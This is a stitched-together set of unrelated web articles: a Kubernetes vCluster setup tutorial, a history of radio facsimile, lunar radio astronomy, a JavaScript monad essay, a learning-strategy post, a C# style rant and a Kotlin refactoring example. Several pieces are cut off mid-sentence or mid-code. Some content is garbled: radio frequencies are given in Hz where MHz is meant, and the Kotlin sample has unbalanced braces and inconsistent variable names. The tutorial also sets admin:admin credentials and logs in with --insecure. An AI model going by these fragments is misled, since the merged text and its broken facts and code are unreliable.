<li><strong><a href="https://github.com/loft-sh/loft">loft vClusters</a>:</strong> A closed source (but <a href="https://loft.sh/pricing">free for up to 3 users</a>) implementation of virtual clusters.</li>
<li><strong><a href="https://github.com/kubernetes-sigs/multi-tenancy/tree/master/incubator/virtualcluster">Multi-Tenancy SIG Virtual Cluster</a>:</strong> An unreleased implementation of a virtual cluster operator for Kubernetes v1.16.</li>
<li><strong><a href="https://github.com/ibuildthecloud/k3v">k3v</a>:</strong> A Proof of Concept of how virtual clusters could work with k3s.</li>
</ul>

<p>This article will mostly talk about the implementation of virtual Kubernetes clusters (vClusters) with <a href="https://loft.sh/">loft</a>.</p>

<h3 id="technical-implementation-of-virtual-clusters">Technical Implementation of Virtual Clusters</h3>

<p>The basic idea of a virtual cluster is to spin up a new Kubernetes cluster within an existing cluster and sync certain core resources between those two clusters.</p>

<p>A host cluster runs the actual virtual clusters pods and needs to be a fully working Kubernetes cluster. The virtual cluster itself only consists of the core Kubernetes components: API server, controller manager and etcd.</p>

<p>To reduce virtual cluster overhead for vClusters in loft, loft builds on <a href="https://k3s.io/">k3s</a>, which is a fully working, lightweight Kubernetes distribution that compiles the Kubernetes components into a single binary and disables all unnecessary Kubernetes features, such as the pod scheduler.</p>

<p>Besides k3s, there is a Kubernetes hypervisor that emulates a fully working Kubernetes setup in the virtual cluster. This component syncs certain virtual cluster resources to the host cluster and back:</p>

<ul>
<li><strong>Pods:</strong> All pods that are started in the virtual cluster are mutated and started in the namespace of the virtual cluster in the host cluster. Service account tokens, environment variables, DNS and other configurations are exchanged to point to the virtual cluster instead of the host cluster. Within the pod, it so seems that the pod is started in the virtual cluster instead of the host cluster.</li>
<li><strong>Services:</strong> All services and endpoints are mutated and created in the namespace of the virtual cluster in the host cluster. The virtual and host cluster share the same service cluster IPs.</li>
<li><strong>PersistentVolumeClaims:</strong> If persistent volume claims are created in the virtual cluster, they will be mutated and created in the namespace of the virtual cluster in the host cluster. If they are bound in the host cluster, the corresponding persistent volume will be synced back to the virtual cluster.</li>
<li><strong>Others:</strong> Other resources such as configmaps, secrets, nodes, persistent volumes and storage classes are also synced between the clusters to assure correct functionality of pods.</li>
</ul>

<p>Besides the synchronization of virtual and host cluster resources, the hypervisor also redirects certain Kubernetes API requests to the host cluster, such as port forwarding or pod/service proxying. It essentially acts as a reverse proxy for the virtual cluster.</p>

<p><img src="https://loft.sh/blog/images/content/vcluster-architecture.png?nf_resize=fit&amp;w=800" alt="" title="Virtual Cluster Architecture"></p>

<p>In the host cluster, all created resources by a virtual cluster are encapsulated in a single namespace (it is also possible to have multiple virtual clusters within a single namespace), which allows system admins to restrict resources of a virtual cluster via resource quotas.
With this architecture, virtual clusters improve isolation:</p>

<ul>
<li>Only certain namespaced resources are synced and available in the host cluster (such as Pods, Services, ConfigMaps etc.).</li>
<li>Users and pods that need to communicate with the virtual cluster (such as operators) now communicate only with the virtual Kubernetes API server instead of the host Kubernetes API server.</li>
<li>Pods cannot directly access host cluster resources.</li>
<li>Virtual cluster resources don’t pollute the host cluster etcd.</li>
</ul>

<p>Since the virtual cluster is a working Kubernetes cluster itself, it is also even possible to install virtual clusters within virtual clusters.</p>

<h2 id="how-to-create-vclusters-in-loft">How to Create vClusters in loft</h2>

<p>To test how virtual clusters work and if they could fit your use case, you can use <a href="https://loft.sh/">loft</a>, a multi-tenancy manager for Kubernetes.
Virtual clusters should work in most Kubernetes clusters above version v1.14 that support persistent volume claims.</p>

<p>You can set up loft for free on your local Kubernetes cluster or in any cloud provider via the following helm commands (see the <a href="https://loft.sh/docs/getting-started/setup">official docs</a> for more information):</p>

<pre><code># Install ingress controller in the cluster
helm install nginx-ingress nginx-ingress --repo https://kubernetes-charts.storage.googleapis.com \
  --namespace nginx-ingress \
  --set-string controller.config.hsts=false \
  --create-namespace \
  --wait

# Install loft with self signed certificate
# Change loft.localhost to your desired url
# and make sure the URL points to the ingress
# controller LoadBalancer external ip
helm install loft loft --repo https://charts.devspace.sh/ \
  --namespace loft \
  --create-namespace \
  --set admin.username=admin \
  --set admin.password=admin \
  --set certIssuer.create=false \
  --set ingress.host=loft.localhost \
  --set ingress.tls.secret=loft-cert \
  --set cluster.connect.local=true \
  --wait
</code></pre>

<p>Wait until loft is running and make sure you install the <a href="https://loft.sh/docs/getting-started/setup#install-loft-cli">loft CLI</a> and log in to your loft instance:</p>

<pre><code># Login in the UI with admin:admin
loft login https://loft.localhost --insecure
</code></pre>

<p>You can now create a new virtual cluster via the loft CLI in any namespace you like:</p>

<pre><code># if the namespace does not exist, loft will create it for you
loft create vcluster test --space mynamespace
</code></pre>

<p>If the command ends successfully, loft will also switch your current local kube-context to access the virtual cluster, which you can test via <code>kubectl</code>:</p>

<pre><code>kubectl get namespaces
NAME              STATUS   AGE
default           Active   37s
kube-system       Active   37s
kube-public       Active   37s
kube-node-lease   Active   37s
</code></pre>

<p>You can now use the vCluster in the same way as any other Kubernetes cluster.</p>

</blockquote>

<h2 id="advantages-and-limitations-of-virtual-clusters">Advantages and Limitations of Virtual Clusters</h2>

<p>We think virtual clusters are an interesting new technology that can drastically reduce cost and effort for several use cases, such as ephemeral environments.
Compared to the approach of creating many small independent clusters, virtual clusters have multiple advantages:</p>

<ul>
<li>Less cluster boilerplate (one k3s pod in a shared host cluster vs a complete standalone Kubernetes cluster)</li>
<li>Easier to manage (helm deploy/delete vs custom terraform scripts)</li>
<li>Less startup and teardown time (seconds vs minutes)</li>
</ul>

<p>While virtual clusters seem promising, they also have some limitations that should be taken into consideration:</p>

<ul>
<li>Not all Kubernetes features work in virtual clusters (e.g. virtual storage classes, virtual container runtimes, network plugins etc.).</li>
<li>Isolation between standalone clusters is obviously still better than between virtual clusters having the same host cluster.</li>
</ul>

<blockquote>
<p>For a more detailed analysis of benefits and use cases of virtual clusters, take a look at <a href="https://loft.sh/blog/virtual-clusters-for-kubernetes-benefits-use-cases/">this article</a>.</p>
</blockquote>

<h2 id="conclusion">Conclusion</h2>

<p>Virtual clusters have the potential to become an important component in the Kubernetes ecosystem. Being more cost-effective and easier to manage than many small clusters while at the same time being better isolated than namespaces makes virtual clusters a superior solution for many use cases.

	<br><span>INTRODUCTION</span></p>
    <p>
	<big>
    In the early 1930’s, radio was the newspaper’s worst enemy.&nbsp; Radio 
    competed for advertising dollars and offered a free news alternative to a 
    cost-conscious public during the depression years.&nbsp; It also offered an 
    immediacy that was not possible for a newspaper, and which publishers feared 
    could undermine their business.&nbsp; The result was a war waged by newspaper 
    interests against radio in the 1930’s that attempted to keep stations from 
    broadcasting the news. &nbsp;The wire services at first boycotted radio 
    completely and later set up a <i>Press Radio Bureau</i> that was designed to 
    give broadcasters limited amounts of news service with restrictions designed 
    to keep radio from competing with newspapers.&nbsp; But some radio stations, 
    particularly WOR in New York, revolted against this attempt by newspaper 
    interests to monopolize news reporting and banded together to form their own 
    news service, the <i>Transradio News</i>.&nbsp; Despite a host of legal 
    challenges, <i>Transradio</i> survived and thrived, and eventually broke the 
    newspapers’ monopoly on the news. &nbsp;The result was an about-face strategy by 
    the newspapers — they began to buy up radio stations in major cities around 
    the country under a “if you can’t beat them, join them”, philosophy.&nbsp; Soon 
    there were stations owned by the major newspapers all over the country:&nbsp; in 
    Chicago, Detroit, Cleveland, St. Louis, Sacramento, San Francisco and 
    elsewhere.&nbsp; </big></p>
    <p>The obvious next step was for newspaper owners to find a way to 
    “synergize” their newspaper-radio combinations.&nbsp; One of the methods they 
    tried was a new technology called Radio Facsimile. </p>
    <p>Radio facsimile had the potential of becoming the 
    “dream application” for newspaper-owned radio stations.&nbsp; In the short term, 
    it would allow them to transmit news bulletins to their subscribers 
    overnight via the airwaves, generating additional subscription and 
    advertising revenue.&nbsp; It also had the long-term potential to eliminate the 
    costly newspaper printing and delivery process completely, allowing the 
    delivery of news to subscribers via radio at a relatively low cost.&nbsp; It 
    could also shift the distribution cost from the publisher to the consumer if 
    the latter could be convinced to purchase and maintain his own facsimile 
    printer.&nbsp; These motives and other factors resulted in a flurry of 
    experimental radio facsimile activity on radio stations around the United 
    States in the latter part of the 1930’s.</p>
    <p><big>&nbsp;<span>EARLY 
	RADIO FACSIMILE EFFORTS</span></big></p>
    <p>&nbsp;The concept of sending images by wire had been around 
    for a long time before it was ever applied to radio.&nbsp; The first rudimentary 
    fax patent was issued in Paris in 1843 and used a swinging pendulum to draw 
    the image.&nbsp; Englishman Edwin Belin first demonstrated his Belinograph in 
    1913.&nbsp; Western Union and AT&amp;T both transmitted photos via wire in the early 
    1920’s, and the technology was quickly accepted by the press as a way to 
    send newspaper photos instantly to cities around the country.&nbsp; RCA was the 
    first company to adapt facsimile to radio, and sent a transoceanic image of 
    President Calvin Coolidge from New York to London on November 29, 1924.&nbsp; Two 
    years later, RCA began a commercial service of transmitting transoceanic 
    photos by shortwave radio for the newspaper industry, and transmitting 
    weather maps to ships at sea.&nbsp; RCA’s patented “Photoradio” technology was 
    invented by RCA scientists Richard H. Ranger and Charles J. Young.&nbsp; It used 
    a rotating drum and a photoelectric scanner to convert a document into a 
    continuous tone that varied in pitch with changes in the image.&nbsp; The image 
    was reproduced on the receiving end with another rotating drum having a 
    stylus that pressed black carbon paper against white paper to reproduce the 
    image. </p>
    <p>
	<big>&nbsp;A few radio broadcasters showed early interest in 
    adapting the technology to send pictures to the public.&nbsp; KPO in San 
    Francisco, owned by the <i>San Francisco Chronicle</i>, became the first 
    radio broadcaster to transmit a photograph by radio when it transmitted a 
    picture of cartoon character Andy Gump on August 22, 1925.&nbsp; The image was 
    signed by <i>Chronicle</i> publisher George T. Cameron with the message 
    "Radio's latest wonder - pictures through the air.&nbsp; What new marvels will 
    this science bring forth?"&nbsp;&nbsp; The image was received on a single machine 
    invented by C. Francis Jenkins. &nbsp;Some other early radio broadcasters who 
    experimented with the transmission of images via AM broadcasting were KSD, 
    owned by the <i>St. Louis Post-Dispatch</i>, WTMJ, the <i>Milwaukee Journal</i> 
    station, and WOR in Newark.&nbsp; In fact, KSD had conducted experiments with 
    facsimile transmission over phone lines as early as 1923. &nbsp;WOR used the 
    Cooley-Ray Foto System developed by Austin Cooley to transmit images late at 
    night.&nbsp; Experimenters could make their own Cooley-Ray receivers by modifying 
    old phonographs. </big></p>
    <p><big>&nbsp;<span>WILLIAM 
	FINCH MARKETS THE RADIO FACSIMILE</span></big></p>
    <p>
	<big>&nbsp;But William G. H. Finch was the person who really 
    brought radio facsimile into the public’s eye.&nbsp; Finch was born in England in 
    1897 and moved to Cincinnati in 1906, where he studied electrical 
    engineering and radio communications at Columbia University and the 
    University of Cincinnati before going to work for the Hearst Family’s <i>
    International News Service</i>.&nbsp; While at the INS, he set up the first radio 
    teletype circuits between New York, Chicago and Havana. </big></p>
    <p>
	<big>&nbsp;While working for the INS, he developed an interest in 
    facsimile machines, and his experiments led him to amass a portfolio of 
    patents that eventually numbered in the hundreds.&nbsp; In 1935, he established 
    his own company, <i>Finch Telecommunications Laboratories</i>, to build and 
    market his system.&nbsp; Unlike RCA, who had only concentrated on the commercial 
    applications of its technology, Finch envisioned the delivery of newspapers 
    to the general public via radio facsimile.&nbsp; The Finch system got around the 
    RCA patents in a number of ways.&nbsp; First, the image details were transmitted 
    by varying the amplitude of an audio tone instead of its frequency.&nbsp; 
    Secondly, it recreated the image by generating an electric current at the 
    tip of a stylus that traced the image onto thermally sensitive paper.&nbsp; 
    Synchronization between the transmitter and receiver was accomplished by 
    using the 60 Hz line voltage frequency.</big></p>
    <p>&nbsp;The Finch scanning head used a light bulb, lens and 
    photocell to focus a pinpoint scanning spot on the document.&nbsp; An electric 
    motor moved the scanning head across the page and another motor advanced the 
    page slightly at the end of each scanning line.&nbsp; The voltage created by the 
    photocell was used to vary the intensity of a high frequency tone, and low 
    frequency sync pulses were inserted to signal the end of each line.&nbsp; The 
    result was an audio signal that could be fed into any conventional AM 
    transmitter.&nbsp; &nbsp;</p>
    <p>The Finch receiver, which sold for $125, was housed in 
    a one-foot square …</p></td></div></div>

<p>The Moon is an object that <a href="https://jatan.space/why-explore-the-moon/">holds immense scientific value</a> by itself. Its airless nature makes it a geological time capsule, allowing scientists to observe its features and infer events that took place in our Solar System millions and even billions of years ago. The Moon also has extrinsic scientific value; scientists consider it a good place for placing radio telescopes to better understand the Universe.</p>



<div><figure><img loading="lazy" width="1024" height="501" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?resize=1024%2C501&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?w=1024&amp;ssl=1 1024w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?resize=200%2C98&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?resize=768%2C376&amp;ssl=1 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>An artist’s impression of radio telescopes on the Moon’s farside.&nbsp;<a href="https://spaceflight.nasa.gov/gallery/images/exploration/lunarexploration/html/s89_25054.html">Credit: NASA</a></figcaption></figure></div>



<p>There are hundreds of radio telescopes on Earth, some of which helped produce the headline-making&nbsp;<a href="https://www.eso.org/public/news/eso1907/">black hole image</a>. Why do radio astronomy from the Moon?</p>



<p>Earth-based radio telescopes are great but can only detect higher frequency emissions from cosmic objects. The Earth’s atmosphere is largely opaque to lower frequencies emitted by these objects, especially below 30Hz. Even observing up to 100 Hz is challenging. Observing at lower frequencies is made more difficult by the multitude of human-built technologies which bombard radio waves in the same range. It just so happens that these lower frequencies are valuable in understanding a as-yet-inaccessible slice of time right after the birth of our Universe.</p>



<p>Enter the Moon, which only shows its one half to Earth because its tidally locked to our planet. The other half, the farside, never sees Earth and is thus shielded from radio interference. The Moon being airless allows detecting low frequency radio waves with no fuss. To that end, one mission on the Moon’s farside is making low frequency observations of the Universe as we speak.</p>



<p>In January 2019, China landed the <a href="https://www.planetary.org/space-missions/change-4">Chang’e 4</a> spacecraft on the Moon’s farside, the first such feat ever. Since the farside cannot see Earth, the lander communicates to us via a relay satellite, Queqiao, placed 65,000 kilometers away in a stable orbit that provides a line of sight to Earth. Both the lander and Queqiao are <a href="http://epizodyspace.ru/bibl/inostr-yazyki/planetary-and-space-science/2018/Jia_et_al_The_Chang-E-4_Mission_Planetary_and_Space_Science_in_press_(2017).pdf">equipped</a> with three five-meter radio antennae to observe the Universe at low frequencies. As the Moon orbits Earth, the spacecraft duo detect emissions ranging from deep space objects like galaxies to ones in our Solar System like the Sun and Jupiter and more.</p>



<div><figure><img loading="lazy" width="1012" height="568" src="https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?resize=1012%2C568&amp;ssl=1" alt="" srcset="https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?w=1012&amp;ssl=1 1012w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?resize=200%2C112&amp;ssl=1 200w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?resize=768%2C431&amp;ssl=1 768w" sizes="(max-width: 1012px) 100vw, 1012px" data-recalc-dims="1"><figcaption>A render of the Chang’e 4 lander on the Moon’s farside with its three radio antennae deployed. <a href="https://www.planetary.org/space-images/change-4-lander">Credit: CNSA</a></figcaption></figure></div>







<p>Both the Chang’e 4 lander and Queqiao are particularly observing radio emissions by hydrogen atoms in the slice of time between the Universe’s birth and the first stars being born. This slice of time refers to 300 to 800 million years after the Big Bang, the latter being our current consensus of how the Universe began. Currently, Queqiao’s observations are limited to the latter part of this time range because while one of the three antennae <a href="https://room.eu.com/news/change-4-relay-satellite-now-a-radio-telescope">deployed</a> perfectly, the other two were stuck at 2.5 meters length. It will be interesting to see the results coming out from these unprecedented observations from the Change’s 4 mission.</p>



<div><figure><img loading="lazy" width="780" height="307" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?resize=780%2C307&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?w=780&amp;ssl=1 780w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?resize=200%2C79&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?resize=768%2C302&amp;ssl=1 768w" sizes="(max-width: 780px) 100vw, 780px" data-recalc-dims="1"></figure></div>







<p>Such versatile and near-continuous observation capability of the Chang’e 4 mission is being used to create a radio map of the sky. To further that goal, these two spacecraft are also being tested to make use of interferometry, a technique used by multiple radio observatories on Earth to achieve higher resolution views of cosmic objects. Interferometry is what helped produce the first image of a black hole for instance. In all, the Chang’e 4 mission is demonstrating the potential for radio astronomy on the Moon. China hopes to build on its success with the the launch of <a href="https://spacenews.com/china-is-moving-ahead-with-lunar-south-pole-and-near-earth-asteroid-missions/">Chang’e 7 in 2024</a>.</p>



<p>The radio-queit lunar farside with its access to unique radio frequencies have led astronomers to even propose observing <a href="https://arxiv.org/abs/0902.0493">faint radio emissions from Jupiter-sized exoplanets</a> from the Moon! In the long run, industrially enabled Moon settlements would allow for building larger radio telescopes, perhaps using the plenty of <a href="https://moonmonday.wordpress.com/category/craters/">craters</a> as a naturally available concave base, in the style of <a href="https://en.wikipedia.org/wiki/Arecibo_Observatory">Arecibo</a> and <a href="https://en.wikipedia.org/wiki/Five-hundred-meter_Aperture_Spherical_Telescope">FAST</a>. With interferometry added to the mix, the Moon’s farside will become a valuable place for high resolution and unique radio observations of the Universe.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>I got into a discussion about monads recently. On a search to find some resources to share, I realized that most essays explained them with type signatures and rules. A missing ingredient to grok them, I think, is to understand the intuition behind them. How could you end up <em>inventing</em> monads?</p><p>Okay, let’s try to build that intuition. We’ll avoid both types and category theory.</p><p>Say you have a few functions to get a user, a profile, and a display picture:</p><pre><code>function getUser(id) { 
  return USERS[id] 
}

function getProfile(user) { 
  return user.profile
}

function getDisplayPicture(profile) { 
  return profile.displayPicture
}</code></pre><p>Now, given an id, how would you get the profile picture?</p><p>You could write this: </p><pre><code>getDisplayPicture(getProfile(getUser(id)))</code></pre><p>Buut, this would throw an error: all these functions <em>could</em> return null. If <code>getUser</code> returned null for example, you would see: </p><pre><code>Uncaught TypeError: Cannot read property 'profile' of undefined</code></pre><p>To fix this, you may end up writing something like this:</p><pre><code>function getDisplayPictureFromId(id) { 
  const user = getUser(id)
  if (!user) return
  const profile = getProfile(user)
  if (!profile) return
  return getDisplayPicture(profile)
}</code></pre><p>But, this is getting pretty ugly. All these conditional returns distract from what you’re really trying to do. <strong>What if there was a way to get rid of these conditionals?</strong></p><p>So, that’s our challenge: let’s get rid of these conditionals. One way we can do this, is to make some kind of helper. This helper would let us chain these functions together: </p><pre><code>new Chainer(getUser(id))
  .whenExists(user =&gt; getProfile(user))
  .whenExists(profile =&gt; getDisplayPicture(profile))</code></pre><p>This looks pretty good. Let’s implement it.</p><h2>whenExists</h2><p><code>.whenExists</code> would only run the callback if the value exists. Here’s how you could write this:</p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
}</code></pre><p>And voila, with just this, we can now write</p><pre><code>function getProfilePictureFromId(id) { 
  return new Chainer(getUser(id))
    .whenExists(user =&gt; getProfile(user))
    .whenExists(profile =&gt; getDisplayPicture(profile))
}</code></pre><h2>More Problems</h2><p>Notice that <code>getDisplayPictureFromId</code> now returns a <code>Chainer</code>. </p><p>Imagine we had another function <code>resizeDisplayPicture</code>, that <em>also</em> returned a Chainer</p><pre><code>function resizeDisplayPicture(pic) { 
    return new Chainer(pic).whenExists(pic =&gt; ...
}</code></pre><p>What would happen, if we wrote:</p><pre><code>getProfilePictureFromId(id).whenExists(pic =&gt; resizeDisplayPicture(pic))</code></pre><p>Let’s look at whenExists again:</p><pre><code>whenExists(f) { 
  if (!this.value) return this;
  return new Chainer(f(this.value))
}</code></pre><p>If <code>getProfilePictureFromId(id)</code> did exist, we would run </p><pre><code>new Chainer(f(this.value))</code></pre><p>which in this case is</p><pre><code>new Chainer(resizeDisplayPicture(this.value)) </code></pre><p>Which becomes </p><pre><code>new Chainer(new Chainer(this.value)...</code></pre><p><strong>Uh oh. We now have a Chainer inside of a Chainer.</strong> Ideally, we’d want a function that somehow “merged” these chainers together.</p><h2>whenExistsMerge</h2><p>So let’s do that. We can call it <code>whenExistsMerge</code></p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
  whenExistsMerge(f) { 
      if (!this.value) return this;
      return f(this.value)
  }
}</code></pre><p>And with that, we can write </p><pre><code>getProfilePictureFromId(id)
  .whenExistsMerge(pic =&gt; resizeDisplayPicture(pic))
  .whenExists(resizedPic =&gt; ...)</code></pre><p><strong>Aand voila, you’ve just invented a specific type of monad.</strong> Kind of (1). Chainer is analogous to the <code>Maybe</code> monad. <code>whenExists</code> is analogous to its <code>fmap</code> operation, and <code>whenExistsMerge</code> is analogous to its <code>bind</code> operation. If you’re curious about the type-based technicalities now, <a href="http://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html" target="_blank">see this essay</a>. </p><p>So, now we’ve found this cool <code>Chainer</code>. We can stop here, or think a bit further. What’s so special about it? </p><p>Well, it’s like a box that wraps around some information. We can interact with that box with  <code>whenExists</code> and <code>whenExistsMerge</code>.</p><p>How else can we use the idea of <code>box</code> and <code>whenExists?</code></p><p>Here’s one. Let’s say you were dealing with callback hell: </p><pre><code>fetchUser(id, (err, user) =&gt; {
  if (err) ... 
    fetchProfile(profile, (err, profile) =&gt; { 
      if (err) ...
        fetchDisplayPicture(...
    }
}</code></pre><p>What if we created something like an <code>Async Chainer</code>: it stores the result of some future computation. Then, you could use the <code>whenExists*</code> functions, which let you interact with the value <em>when</em> it is computed. We turn the callback hell into</p><pre><code> fetchUser(id).whenExistsMerge(fetchProfile).whenExistsMerge(fetchDisplayPicture)</code></pre><p>Well, replace <code>whenExistsMerge</code> with <code>then</code>, and you're on a road to discover <code>Promise</code>, which is also a monad. Kind of (2). </p><p>Now, it’s pretty cool to notice that both the nullable use case and the async use case have the same interface. The name <code>whenExists</code> may be a bit too specific. Really, what it does is give you an interface to <code>map</code> over the value. If you use the word <code>map</code>, <code>whenExistsMerge</code> really lets you <code>flatMap</code> over the value. </p><p>This begins to get us to the fundamental abstraction of a monad: a box, with an interface for <code>map</code>, and <code>flatMap</code>. As you look deeper, you’ll notice that this abstraction can handle a lot of other things. If you’re curious, research the <code>Result</code> monad for example.</p><p>And with that, you’ve invented monads : ) </p><h2>Aside: Do you <em>really</em> need this?</h2><p>As you went through this, you may have realized that there are other ways to solve the problems that monads solve. Instead of <code>Chainer</code>, your language could have a <a href="https://kotlinlang.org/docs/reference/null-safety.html#safe-calls" target="_blank">safe call</a> abstraction. Instead of <code>Promise</code>, your language could have an <code>async/await</code> abstraction. Sometimes those can be a better <a href="https://www.youtube.com/watch?v=YR5WdGrpoug" target="_blank">better choice</a>. Nevertheless, if your language doesn’t have those abstractions, you can use monads to solve them. And of course, like any powerful abstraction, you can invent new monads to simplify your business logic.</p><hr><p>(1) I cheated a bit with <code>Chainer</code>, by avoiding the subtypes <code>Just</code> and <code>Nothing</code>. This makes it so you can’t express something like <code>Just(null)</code>. Still, it gets at the essence : ) </p><p>(2) Likewise, <code>Promise</code> isn’t quite a monad, because it mixes both <code>flatMap</code> and <code>map</code> with <code>then</code>. This makes it so you can’t have a <code>Promise&lt;Promise&lt;Res&gt;&gt;</code>. Again though, it gets at the essence</p><p><em>Thanks to Joe Averbukh, Mark Shlick, Daniel Woelfel, Irakli Safareli, Jacky Wang for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

<p>Just-In-Time learning means you learn a thing because you need to know it right then. Just-In-Case learning means you learn a thing because it may come in handy at some point in your life. This separation is <a href="https://hackernoon.com/just-in-case-vs-just-in-time-learning-c87f61d24360">already well documented</a>, even <a href="https://en.wikipedia.org/wiki/Just-in-time_learning">on Wikipedia</a>.</p>



<p>It gets more interesting when you combine it with <a href="https://www.collaborativefund.com/blog/expiring-vs-permanent-skills/">expiring skills vs. permanent skills</a>. Expiring skills will eventually stop being useful, and permanent skills will be just as useful decades from now as they are today. Permanent skills compound over time, and expiring skills don’t. So if you learn an expiring skill, and don’t end up using it right away, then it’s only a matter of time until that skill is irrelevant, and all your time spent learning it was wasted. </p>



<p>If you know a skill is going to eventually expire, then you should only learn it if you’re sure you can use it. <em>Expiring skills should only be learned Just-In-Time, but permanent skills are worthwhile to learn Just-In-Case</em>. But the tricky and somewhat disappointing bit is that the only skills we can consider permanent are soft skills – things like attitude, discipline, charisma. Hard skills like Typescript and Kubernetes will eventually be obsolete, so learning them Just-In-Case is a waste of time.</p>



<p>But then how can I ever become a well rounded technologist, you ask? You work really freaking hard to get on projects with technology you haven’t used before. If you get an opportunity to hop onto a project using some tech that’s new to you, then do it. </p>



<p>When someone asks for some help with a build system you’ve never used before, raise your hand. When a project needs realtime streaming data and you have no idea how to do it, raise your hand. When a client gets excited about creating an Alexa skill, raise your hand. </p>



<p>Raising your hand gets you the best of both worlds. You get to become a well rounded technologist <em>and</em> avoid wasting your time learning technology you won’t ever use.</p>



<p>So raise your hand to learn the hard skills when they’re needed, and spend your Just-In-Case learning on the stuff that will stick around. Put down the Python book (unless you’re working on a Python project) and pick up the book on habit forming, or dealing with difficult people, or taking ownership. That’s the stuff that will compound for the rest of your life.</p>

                    <p>I'm a highly opinionated developer. I've been doing it a little while, and worked with a few other developers, and this is a pet peeve of mine. The <code>this</code> keyword, at least in C#, is oft misused and abused. From henceforth, the context of this post is C# development.</p>
<p>This post seems to have caused a bit of controversy. More to my point, even in base Visual Studio, there are warnings to remove <code>this</code> from your code:
<img src="https://i.imgur.com/9F6Lyx8.png" alt="visual studio 2019"></p>
<p>I've had managers want developers to use <code>this</code> to signify calling a base class's method, which is incorrect. You should be using <code>base</code>.</p>
<pre><code>public class MyClass : YourClass {
    public void MyMethod() {
        if(!base.YourMethod()) return;
    }
}</code></pre>
<p>I've had coworkers who would put <code>this</code> before every method call, because...? When calling your own method, in your own class, that inherits/implements no other classes, why on earth would you decorate your own method call with <code>this</code>?</p>
<p>The only time I have seen prepending <code>this</code> to anything as <em>kind of</em> acceptable, is when you have parameters in a method that are the same as fields/properties on your class, and you need to access those fields/properties inside said method. I am still not a fan of this, but the closest I will get to accepting it is in a constructor where you are passing values that will be stored as <strong>private</strong> fields.</p>
<pre><code>public class SomeClass {
    int maxAmount;
    SomeClass(int maxAmount) =&gt; this.maxAmount = maxAmount;
    ValidateMe(int someValue) =&gt; someValue &lt;= maxAmount;
}</code></pre>
<p>But even in this case, you should really be using Pascal casing as per <a href="https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions">Microsoft's Capitalization Conventions</a>. I know, capitalization conventions change over time, and I could have <strong>sworn</strong> there was a time when camel casing was the recommended approach for fields (specifically private fields), but times they are a changing, and cleaner code will hopefully prevail, especially cleaner code without the misuse/abuse of <code>this</code>.</p>
<p>Maybe I'm the only one this matters for, or maybe I'm just having a bad day and came across <code>this</code> too many times this morning. I do hope you agree though.</p>

The problem is you have never seen a real turtle before. The only thing you know about turtles is that they can swim, have four legs and are reptiles. As you walk into the petstore you see a lot of different species of animals. You decide to write a simple program to determine whether an animal is a turtle or not.</p> <p>The program you write looks something like this:</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>
    <span>var</span> <span>isTurle</span><span>:</span><span>Boolean</span> <span>=</span> <span>false</span>
    <span>if</span><span>(</span><span>canSwim</span><span>())</span> <span>{</span>

            <span>if</span><span>(</span><span>isReptile</span><span>())</span> <span>{</span>
                <span>isTurtle</span> <span>=</span> <span>true</span>
            <span>}</span> <span>else</span> <span>{</span>
                <span>isTurtle</span> <span>=</span> <span>false</span>
            <span>}</span>
        <span>}</span> <span>else</span> <span>{</span>
            <span>isTurtle</span> <span>=</span> <span>false</span>
        <span>}</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>isTurle</span> <span>=</span> <span>false</span>
    <span>}</span>

    <span>return</span> <span>isTurtle</span>
<span>}</span></code></pre></figure> <h2 id="maintenance-nightmare">Maintenance nightmare</h2> <p>After having checked all animals in the shop you are still left with two. They both can swim, have four legs and are reptiles.</p> <p>You try to add one more condition, but because there are so many conditions already you find it hard to modify your program. You want to make sure you don’t make any mistake. The horror if your present happens to be a crocodile and the guests will be eaten instead of the cake.</p> <blockquote> <p>How would you change the code to make this program more readable?</p> </blockquote> <h2 id="refactor-to-a-recipe">Refactor to a recipe</h2> <p>The first thing you realize is that when an animal cannot swim it cannot be a turtle. Therefore we can safely take out te <strong>canSwim()</strong> condition and use an early return when the animal cannot swim.</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>

    <span>// Check whether current animal can swim or not.</span>
    <span>if</span><span>(!</span><span>canSwim</span><span>())</span> 
        <span>return</span> <span>false</span> <span>// If the animal can't swim, we are done.</span>

    <span>// From now on we know that we are dealing with an animal that can swim</span>

    <span>var</span> <span>isTurle</span><span>:</span><span>Boolean</span> <span>=</span> <span>false</span>

    <span>// Therefore we don't have to check whether the turtle can swim anymore, so we remove the check.</span>

    <span>if</span><span>(</span><span>hasFourLegs</span><span>())</span> <span>{</span>
        <span>if</span><span>(</span><span>isReptile</span><span>())</span> <span>{</span>
            <span>isTurtle</span> <span>=</span> <span>true</span>
